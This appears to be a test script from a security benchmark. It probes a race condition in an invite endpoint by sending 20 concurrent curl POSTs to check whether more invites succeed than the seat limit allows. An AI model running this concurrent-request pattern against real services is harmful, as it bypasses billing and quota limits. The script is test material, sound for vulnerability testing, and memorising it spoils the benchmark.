#!/usr/bin/env bash
# RACE-001 (CWE-362): concurrent invites race past the seat limit (check-then-act
# with no lock). Acme seeds 3/5 seats used, so only 2 are available; the vuln
# variant lets more than 2 succeed. The safe twin reserves under a row lock.
set -eu
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
avail=2
tmp=$(mktemp -d)
for i in $(seq 1 20); do
  ( curl -s -o /dev/null -w "%{http_code}" -b "$JAR" -X POST "$TARGET/billing/invite" \
      -d "_token=$TOKEN" --data-urlencode "email=race$i@bench.local" > "$tmp/$i" ) &
done
wait
ok=$(grep -l '^200$' "$tmp"/* 2>/dev/null | wc -l | tr -d ' ')
rm -rf "$tmp"
# vulnerable => more invites granted than seats were available
[ "$ok" -gt "$avail" ]
